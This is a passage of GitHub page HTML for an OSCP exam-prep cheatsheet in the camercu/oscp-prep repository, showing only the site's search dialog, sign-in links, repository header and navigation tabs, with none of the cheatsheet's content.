          </div>

          <p class="text-small color-fg-muted">
            To see all available qualifiers, see our <a class="Link--inTextBlock" href="https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax">documentation</a>.
          </p>
</form>        </div>

        <div data-target="custom-scopes.manageCustomScopesForm">
          <div data-target="custom-scopes.list"></div>
        </div>

</div>
      </scrollable-region>
      <div data-view-component="true" class="Overlay-footer Overlay-footer--alignEnd Overlay-footer--divided">          <button data-action="click:custom-scopes#customScopesCancel" type="button" data-view-component="true" class="btn">    Cancel
</button>
          <button form="custom-scopes-dialog-form" data-action="click:custom-scopes#customScopesSubmit" data-target="custom-scopes.customScopesSubmitButton" type="submit" data-view-component="true" class="btn-primary btn">    Create saved search
</button>
</div>
</dialog></dialog-helper>
    </custom-scopes>
  </div>
</qbsearch-input>


            <div class="position-relative HeaderMenu-link-wrap d-lg-inline-block">
              <a
                href="/login?return_to=https%3A%2F%2Fgithub.com%2Fcamercu%2Foscp-prep%2Fblob%2Fmain%2FCHEATSHEET.md"
                class="HeaderMenu-link HeaderMenu-link--sign-in HeaderMenu-button flex-shrink-0 no-underline d-none d-lg-inline-flex border border-lg-0 rounded rounded-lg-0 px-2 py-1"
                style="margin-left: 12px;"
                data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;site header menu&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/camercu/oscp-prep/blob/main/CHEATSHEET.md&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="9bbc23078a599cd38f16ed6c1cb68cd9b02f9448118f68aaa6d819e3849cd6fc"
                data-analytics-event="{&quot;category&quot;:&quot;Marketing nav&quot;,&quot;action&quot;:&quot;click to go to homepage&quot;,&quot;label&quot;:&quot;ref_page:Marketing;ref_cta:Sign in;ref_loc:Header&quot;}"
              >
                Sign in
              </a>
            </div>

              <a href="/signup?ref_cta=Sign+up&amp;ref_loc=header+logged+out&amp;ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&amp;source=header-repo&amp;source_repo=camercu%2Foscp-prep"
                class="HeaderMenu-link HeaderMenu-link--sign-up HeaderMenu-button flex-shrink-0 d-flex d-lg-inline-flex no-underline border color-border-default rounded px-2 py-1"
                data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;site header menu&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/camercu/oscp-prep/blob/main/CHEATSHEET.md&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="9bbc23078a599cd38f16ed6c1cb68cd9b02f9448118f68aaa6d819e3849cd6fc"
                data-analytics-event="{&quot;category&quot;:&quot;Sign up&quot;,&quot;action&quot;:&quot;click to sign up for account&quot;,&quot;label&quot;:&quot;ref_page:/&lt;user-name&gt;/&lt;repo-name&gt;/blob/show;ref_cta:Sign up;ref_loc:header logged out&quot;}"
              >
                Sign up
              </a>
          <button type="button" class="sr-only js-header-menu-focus-trap d-block d-lg-none">Reseting focus</button>
        </div>
      </div>
    </div>
  </div>
</header>

      <div hidden="hidden" data-view-component="true" class="js-stale-session-flash stale-session-flash flash flash-warn flash-full">
  
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
        <span class="js-stale-session-flash-signed-in" hidden>You signed in with another tab or window. <a class="Link--inTextBlock" href="">Reload</a> to refresh your session.</span>
        <span class="js-stale-session-flash-signed-out" hidden>You signed out in another tab or window. <a class="Link--inTextBlock" href="">Reload</a> to refresh your session.</span>
        <span class="js-stale-session-flash-switched" hidden>You switched accounts on another tab or window. <a class="Link--inTextBlock" href="">Reload</a> to refresh your session.</span>

    <button id="icon-button-ec143fed-650c-45de-b4fe-b607cc14a804" aria-labelledby="tooltip-8b2a0954-47eb-451d-9594-c83b39c23a49" type="button" data-view-component="true" class="Button Button--iconOnly Button--invisible Button--medium flash-close js-flash-close">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x Button-visual">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
</button><tool-tip id="tooltip-8b2a0954-47eb-451d-9594-c83b39c23a49" for="icon-button-ec143fed-650c-45de-b4fe-b607cc14a804" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute">Dismiss alert</tool-tip>


  
</div>
    </div>

  <div id="start-of-content" class="show-on-focus"></div>








    <div id="js-flash-container" class="flash-container" data-turbo-replace>




  <template class="js-flash-template">
    
<div class="flash flash-full   {{ className }}">
  <div >
    <button autofocus class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
    </button>
    <div aria-atomic="true" role="alert" class="js-flash-alert">
      
      <div>{{ message }}</div>

    </div>
  </div>
</div>
  </template>
</div>


    






  <div
    class="application-main "
    data-commit-hovercards-enabled
    data-discussion-hovercards-enabled
    data-issue-and-pr-hovercards-enabled
    data-project-hovercards-enabled
  >
        <div itemscope itemtype="http://schema.org/SoftwareSourceCode" class="">
    <main id="js-repo-pjax-container" >
      
      






  
  <div id="repository-container-header"  class="pt-3 hide-full-screen" style="background-color: var(--page-header-bgColor, var(--color-page-header-bg));" data-turbo-replace>

      <div class="d-flex flex-nowrap flex-justify-end mb-3  px-3 px-lg-5" style="gap: 1rem;">

        <div class="flex-auto min-width-0 width-fit">
            
  <div class=" d-flex flex-wrap flex-items-center wb-break-word f3 text-normal">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo color-fg-muted mr-2">
    <path d="M2 2.5A2.5 2.5 0 0 1 4.5 0h8.75a.75.75 0 0 1 .75.75v12.5a.75.75 0 0 1-.75.75h-2.5a.75.75 0 0 1 0-1.5h1.75v-2h-8a1 1 0 0 0-.714 1.7.75.75 0 1 1-1.072 1.05A2.495 2.495 0 0 1 2 11.5Zm10.5-1h-8a1 1 0 0 0-1 1v6.708A2.486 2.486 0 0 1 4.5 9h8ZM5 12.25a.25.25 0 0 1 .25-.25h3.5a.25.25 0 0 1 .25.25v3.25a.25.25 0 0 1-.4.2l-1.45-1.087a.249.249 0 0 0-.3 0L5.4 15.7a.25.25 0 0 1-.4-.2Z"></path>
</svg>
    
    <span class="author flex-self-stretch" itemprop="author">
      <a class="url fn" rel="author" data-hovercard-type="user" data-hovercard-url="/users/camercu/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/camercu">
        camercu
</a>    </span>
    <span class="mx-1 flex-self-stretch color-fg-muted">/</span>
    <strong itemprop="name" class="mr-2 flex-self-stretch">
      <a data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" href="/camercu/oscp-prep">oscp-prep</a>
    </strong>

    <span></span><span class="Label Label--secondary v-align-middle mr-1">Public</span>
  </div>


        </div>

        <div id="repository-details-container" class="flex-shrink-0" data-turbo-replace style="max-width: 70%;">
            <ul class="pagehead-actions flex-shrink-0 d-none d-md-inline" style="padding: 2px 0;">
    
      

  <li>
            <a href="/login?return_to=%2Fcamercu%2Foscp-prep" rel="nofollow" id="repository-details-watch-button" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;notification subscription menu watch&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/camercu/oscp-prep/blob/main/CHEATSHEET.md&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="a1510e01cbf4b488e6e6076650dfd102d0b71387969a4b5b1da65e02ea703202" aria-label="You must be signed in to change notification settings" data-view-component="true" class="btn-sm btn">    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-bell mr-2">
    <path d="M8 16a2 2 0 0 0 1.985-1.75c.017-.137-.097-.25-.235-.25h-3.5c-.138 0-.252.113-.235.25A2 2 0 0 0 8 16ZM3 5a5 5 0 0 1 10 0v2.947c0 .05.015.098.042.139l1.703 2.555A1.519 1.519 0 0 1 13.482 13H2.518a1.516 1.516 0 0 1-1.263-2.36l1.703-2.554A.255.255 0 0 0 3 7.947Zm5-3.5A3.5 3.5 0 0 0 4.5 5v2.947c0 .346-.102.683-.294.97l-1.703 2.556a.017.017 0 0 0-.003.01l.001.006c0 .002.002.004.004.006l.006.004.007.001h10.964l.007-.001.006-.004.004-.006.001-.007a.017.017 0 0 0-.003-.01l-1.703-2.554a1.745 1.745 0 0 1-.294-.97V5A3.5 3.5 0 0 0 8 1.5Z"></path>
</svg>Notifications
</a>    <tool-tip id="tooltip-524fd804-e237-4ad0-b8db-7b407f36e28b" for="repository-details-watch-button" popover="manual" data-direction="s" data-type="description" data-view-component="true" class="sr-only position-absolute">You must be signed in to change notification settings</tool-tip>

  </li>

  <li>
          <a icon="repo-forked" id="fork-button" href="/login?return_to=%2Fcamercu%2Foscp-prep" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;repo details fork button&quot;,&quot;repository_id&quot;:362483662,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/camercu/oscp-prep/blob/main/CHEATSHEET.md&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="598fedac9b1979b39c7d690d940ca2c176beeec1b849ca91271e759a7920dcaf" data-view-component="true" class="btn-sm btn">    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo-forked mr-2">
    <path d="M5 5.372v.878c0 .414.336.75.75.75h4.5a.75.75 0 0 0 .75-.75v-.878a2.25 2.25 0 1 1 1.5 0v.878a2.25 2.25 0 0 1-2.25 2.25h-1.5v2.128a2.251 2.251 0 1 1-1.5 0V8.5h-1.5A2.25 2.25 0 0 1 3.5 6.25v-.878a2.25 2.25 0 1 1 1.5 0ZM5 3.25a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Zm6.75.75a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5Zm-3 8.75a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Z"></path>
</svg>Fork
    <span id="repo-network-counter" data-pjax-replace="true" data-turbo-replace="true" title="12" data-view-component="true" class="Counter">12</span>
</a>
  </li>

  <li>
        <div data-view-component="true" class="BtnGroup d-flex">
        <a href="/login?return_to=%2Fcamercu%2Foscp-prep" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;star button&quot;,&quot;repository_id&quot;:362483662,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/camercu/oscp-prep/blob/main/CHEATSHEET.md&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="398db12c50854e63e0337b3dd6032a9eaff6537fff9455a45f6b5848c4d506d6" aria-label="You must be signed in to star a repository" data-view-component="true" class="tooltipped tooltipped-sw btn-sm btn">    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-star v-align-text-bottom d-inline-block mr-2">
    <path d="M8 .25a.75.75 0 0 1 .673.418l1.882 3.815 4.21.612a.75.75 0 0 1 .416 1.279l-3.046 2.97.719 4.192a.751.751 0 0 1-1.088.791L8 12.347l-3.766 1.98a.75.75 0 0 1-1.088-.79l.72-4.194L.818 6.374a.75.75 0 0 1 .416-1.28l4.21-.611L7.327.668A.75.75 0 0 1 8 .25Zm0 2.445L6.615 5.5a.75.75 0 0 1-.564.41l-3.097.45 2.24 2.184a.75.75 0 0 1 .216.664l-.528 3.084 2.769-1.456a.75.75 0 0 1 .698 0l2.77 1.456-.53-3.084a.75.75 0 0 1 .216-.664l2.24-2.183-3.096-.45a.75.75 0 0 1-.564-.41L8 2.694Z"></path>
</svg><span data-view-component="true" class="d-inline">
          Star
</span>          <span id="repo-stars-counter-star" aria-label="78 users starred this repository" data-singular-suffix="user starred this repository" data-plural-suffix="users starred this repository" data-turbo-replace="true" title="78" data-view-component="true" class="Counter js-social-count">78</span>
</a></div>
  </li>

</ul>

        </div>
      </div>

        <div id="responsive-meta-container" data-turbo-replace>
</div>


          <nav data-pjax="#js-repo-pjax-container" aria-label="Repository" data-view-component="true" class="js-repo-nav js-sidenav-container-pjax js-responsive-underlinenav overflow-hidden UnderlineNav px-3 px-md-4 px-lg-5">

  <ul data-view-component="true" class="UnderlineNav-body list-style-none">
      <li data-view-component="true" class="d-inline-flex">
  <a id="code-tab" href="/camercu/oscp-prep" data-tab-item="i0code-tab" data-selected-links="repo_source repo_downloads repo_commits repo_releases repo_tags repo_branches repo_packages repo_deployments repo_attestations /camercu/oscp-prep" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g c" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Code&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" aria-current="page" data-view-component="true" class="UnderlineNav-item no-wrap js-responsive-underlinenav-item js-selected-navigation-item selected">
    
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-code UnderlineNav-octicon d-none d-sm-inline">
    <path d="m11.28 3.22 4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L13.94 8l-3.72-3.72a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215Zm-6.56 0a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042L2.06 8l3.72 3.72a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L.47 8.53a.75.75 0 0 1 0-1.06Z"></path>
</svg>
        <span data-content="Code">Code</span>
          <span id="code-repo-tab-count" data-pjax-replace="" data-turbo-replace="" title="Not available" data-view-component="true" class="Counter"></span>


    
</a></li>
      <li data-view-component="true" class="d-inline-flex">
  <a id="issues-tab" href="/camercu/oscp-prep/issues" data-tab-item="i1issues-tab" data-selected-links="repo_issues repo_labels repo_milestones /camercu/oscp-prep/issues" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g i" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Issues&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true" class="UnderlineNav-item no-wrap js-responsive-underlinenav-item js-selected-navigation-item">
    
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-issue-opened UnderlineNav-octicon d-none d-sm-inline">
    <path d="M8 9.5a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path><path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Z"></path>
</svg>
        <span data-content="Issues">Issues</span>
          <span id="issues-repo-tab-count" data-pjax-replace="" data-turbo-replace="" title="0" hidden="hidden" data-view-component="true" class="Counter">0</span>


    
</a></li>
      <li data-view-component="true" class="d-inline-flex">
  <a id="pull-requests-tab" href="/camercu/oscp-prep/pulls" data-tab-item="i2pull-requests-tab" data-selected-links="repo_pulls checks /camercu/oscp-prep/pulls" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g p" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Pull requests&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true" class="UnderlineNav-item no-wrap js-responsive-underlinenav-item js-selected-navigation-item">
    
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-git-pull-request UnderlineNav-octicon d-none d-sm-inline">
    <path d="M1.5 3.25a2.25 2.25 0 1 1 3 2.122v5.256a2.251 2.251 0 1 1-1.5 0V5.372A2.25 2.25 0 0 1 1.5 3.25Zm5.677-.177L9.573.677A.25.25 0 0 1 10 .854V2.5h1A2.5 2.5 0 0 1 13.5 5v5.628a2.251 2.251 0 1 1-1.5 0V5a1 1 0 0 0-1-1h-1v1.646a.25.25 0 0 1-.427.177L7.177 3.427a.25.25 0 0 1 0-.354ZM3.75 2.5a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Zm0 9.5a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Zm8.25.75a.75.75 0 1 0 1.5 0 .75.75 0 0 0-1.5 0Z"></path>
</svg>
        <span data-content="Pull requests">Pull requests</span>
          <span id="pull-requests-repo-tab-count" data-pjax-replace="" data-turbo-replace="" title="0" hidden="hidden" data-view-component="true" class="Counter">0</span>


    
</a></li>
      <li data-view-component="true" class="d-inline-flex">
  <a id="actions-tab" href="/camercu/oscp-prep/actions" data-tab-item="i3actions-tab" data-selected-links="repo_actions /camercu/oscp-prep/actions" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g a" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Actions&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true" class="UnderlineNav-item no-wrap js-responsive-underlinenav-item js-selected-navigation-item">
    
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-play UnderlineNav-octicon d-none d-sm-inline">
    <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Zm4.879-2.773 4.264 2.559a.25.25 0 0 1 0 .428l-4.264 2.559A.25.25 0 0 1 6 10.559V5.442a.25.25 0 0 1 .379-.215Z"></path>
</svg>
        <span data-content="Actions">Actions</span>
          <span id="actions-repo-tab-count" data-pjax-replace="" data-turbo-replace="" title="Not available" data-view-component="true" class="Counter"></span>


    
</a></li>
      <li data-view-component="true" class="d-inline-flex">
  <a id="projects-tab" href="/camercu/oscp-prep/projects" data-tab-item="i4projects-tab" data-selected-links="repo_projects new_repo_project repo_project /camercu/oscp-prep/projects" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g b" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Projects&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true" class="UnderlineNav-item no-wrap js-responsive-underlinenav-item js-selected-navigation-item">
    
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-table UnderlineNav-octicon d-none d-sm-inline">
    <path d="M0 1.75C0 .784.784 0 1.75 0h12.5C15.216 0 16 .784 16 1.75v12.5A1.75 1.75 0 0 1 14.25 16H1.75A1.75 1.75 0 0 1 0 14.25ZM6.5 6.5v8h7.75a.25.25 0 0 0 .25-.25V6.5Zm8-1.5V1.75a.25.25 0 0 0-.25-.25H6.5V5Zm-13 1.5v7.75c0 .138.112.25.25.25H5v-8ZM5 5V1.5H1.75a.25.25 0 0 0-.25.25V5Z"></path>
</svg>
        <span data-content="Projects">Projects</span>
          <span id="projects-repo-tab-count" data-pjax-replace="" data-turbo-replace="" title="0" hidden="hidden" data-view-component="true" class="Counter">0</span>


    
</a></li>
      <li data-view-component="true" class="d-inline-flex">
  <a id="security-tab" href="/camercu/oscp-prep/security" data-tab-item="i5security-tab" data-selected-links="security overview alerts policy token_scanning code_scanning /camercu/oscp-prep/security" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g s" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Security&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true" class="UnderlineNav-item no-wrap js-responsive-underlinenav-item js-selected-navigation-item">
    
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-shield UnderlineNav-octicon d-none d-sm-inline">
    <path d="M7.467.133a1.748 1.748 0 0 1 1.066 0l5.25 1.68A1.75 1.75 0 0 1 15 3.48V7c0 1.566-.32 3.182-1.303 4.682-.983 1.498-2.585 2.813-5.032 3.855a1.697 1.697 0 0 1-1.33 0c-2.447-1.042-4.049-2.357-5.032-3.855C1.32 10.182 1 8.566 1 7V3.48a1.75 1.75 0 0 1 1.217-1.667Zm.61 1.429a.25.25 0 0 0-.153 0l-5.25 1.68a.25.25 0 0 0-.174.238V7c0 1.358.275 2.666 1.057 3.86.784 1.194 2.121 2.34 4.366 3.297a.196.196 0 0 0 .154 0c2.245-.956 3.582-2.104 4.366-3.298C13.225 9.666 13.5 8.36 13.5 7V3.48a.251.251 0 0 0-.174-.237l-5.25-1.68ZM8.75 4.75v3a.75.75 0 0 1-1.5 0v-3a.75.75 0 0 1 1.5 0ZM9 10.5a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
        <span data-content="Security">Security</span>
          <include-fragment src="/camercu/oscp-prep/security/overall-count" accept="text/fragment+html"></include-fragment>

    
</a></li>
      <li data-view-component="true" class="d-inline-flex">
  <a id="insights-tab" href="/camercu/oscp-prep/pulse" data-tab-item="i6insights-tab" data-selected-links="repo_graphs repo_contributors dependency_graph dependabot_updates pulse people community /camercu/oscp-prep/pulse" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Insights&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true" class="UnderlineNav-item no-wrap js-responsive-underlinenav-item js-selected-navigation-item">
    
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-graph UnderlineNav-octicon d-none d-sm-inline">
    <path d="M1.5 1.75V13.5h13.75a.75.75 0 0 1 0 1.5H.75a.75.75 0 0 1-.75-.75V1.75a.75.75 0 0 1 1.5 0Zm14.28 2.53-5.25 5.25a.75.75 0 0 1-1.06 0L7 7.06 4.28 9.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.25-3.25a.75.75 0 0 1 1.06 0L10 7.94l4.72-4.72a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042Z"></path>
</svg>
        <span data-content="Insights">Insights</span>
          <span id="insights-repo-tab-count" data-pjax-replace="" data-turbo-replace="" title="Not available" data-view-component="true" class="Counter"></span>


    
</a></li>
</ul>
    <div style="visibility:hidden;" data-view-component="true" class="UnderlineNav-actions js-responsive-underlinenav-overflow position-absolute pr-3 pr-md-4 pr-lg-5 right-0">      <action-menu data-select-variant="none" data-view-component="true">
  <focus-group direction="vertical" mnemonics retain>
    <button id="action-menu-55ee0e78-129f-4eba-83a2-20031cf7ab21-button" popovertarget="action-menu-55ee0e78-129f-4eba-83a2-20031cf7ab21-overlay" aria-controls="action-menu-55ee0e78-129f-4eba-83a2-20031cf7ab21-list" aria-haspopup="true" aria-labelledby="tooltip-db53531a-cec3-45f1-9f34-68a07a4f929a" type="button" data-view-component="true" class="Button Button--iconOnly Button--secondary Button--medium UnderlineNav-item">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal Button-visual">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg>
</button><tool-tip id="tooltip-db53531a-cec3-45f1-9f34-68a07a4f929a" for="action-menu-55ee0e78-129f-4eba-83a2-20031cf7ab21-button" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute">Additional navigation options</tool-tip>


<anchored-position data-target="action-menu.overlay" id="action-menu-55ee0e78-129f-4eba-83a2-20031cf7ab21-overlay" anchor="action-menu-55ee0e78-129f-4eba-83a2-20031cf7ab21-button" align="start" side="outside-bottom" anchor-offset="normal" popover="auto" data-view-component="true">
  <div data-view-component="true" class="Overlay Overlay--size-auto">
    
      <div data-view-component="true" class="Overlay-body Overlay-body--paddingNone">          <action-list>
  <div data-view-component="true">
    <ul aria-labelledby="action-menu-55ee0e78-129f-4eba-83a2-20031cf7ab21-button" id="action-menu-55ee0e78-129f-4eba-83a2-20031cf7ab21-list" role="menu" data-view-component="true" class="ActionListWrap--inset ActionListWrap">
        <li hidden="hidden" data-menu-item="i0code-tab" data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-a2c7c62c-7aad-4074-9385-bc2b68d59bee" href="/camercu/oscp-prep" role="menuitem" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-code">
    <path d="m11.28 3.22 4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L13.94 8l-3.72-3.72a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215Zm-6.56 0a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042L2.06 8l3.72 3.72a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L.47 8.53a.75.75 0 0 1 0-1.06Z"></path>
</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
          Code
</span>      
</a>
  
</li>
        <li hidden="hidden" data-menu-item="i1issues-tab" data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-400d2efd-fc9a-4212-80b1-a5337f72d19f" href="/camercu/oscp-prep/issues" role="menuitem" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-issue-opened">
    <path d="M8 9.5a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path><path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Z"></path>
</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
          Issues
</span>      
</a>
  
</li>
        <li hidden="hidden" data-menu-item="i2pull-requests-tab" data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-53e27d24-bbf0-40e4-9fdc-16b634f26c92" href="/camercu/oscp-prep/pulls" role="menuitem" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-git-pull-request">
